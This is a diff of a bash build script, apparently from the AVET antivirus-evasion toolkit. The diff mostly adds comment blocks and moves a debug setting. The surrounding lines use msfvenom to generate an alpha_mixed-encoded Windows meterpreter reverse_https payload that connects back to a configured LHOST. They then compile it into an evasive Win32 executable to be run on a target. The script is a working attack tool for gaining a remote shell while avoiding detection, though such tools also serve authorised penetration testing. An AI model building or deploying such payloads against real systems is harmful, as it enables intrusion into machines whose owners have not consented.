@@ -1,5 +1,11 @@
 #!/bin/bash          
-# Call the generated output.exe on target, delivering the shellcode string in output/alpha_mixed.txt as command line argument
+
+
+#DESCRIPTION_START
+# Call the generated output.exe on target, 
+# delivering the shellcode string in output/alpha_mixed.txt as command line argument
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -15,9 +21,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload, encoded with msf alpha_mixed 
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > output/sc_alpha_mixed.txt
@@ -39,9 +51,6 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode_ASCIIMSF
 
-# enable debug output
-enable_debug_print
-
 # compile to exe file
 $win32_compiler -ffixed-eax -o output/asciimsf_fromcmd_revhttps_win32.exe source/avet.c
 strip output/asciimsf_fromcmd_revhttps_win32.exe
@@ -51,3 +60,9 @@ cleanup_techniques
 
 echo "
 Call the generated output.exe on target, delivering the shellcode string in output/sc_alpha_mixed.txt as command line argument"
+
+
+#USAGE_START
+# Call the generated .exe on target, 
+# delivering the shellcode string in output/sc_alpha_mixed.txt as command line argument
+#USAGE_END
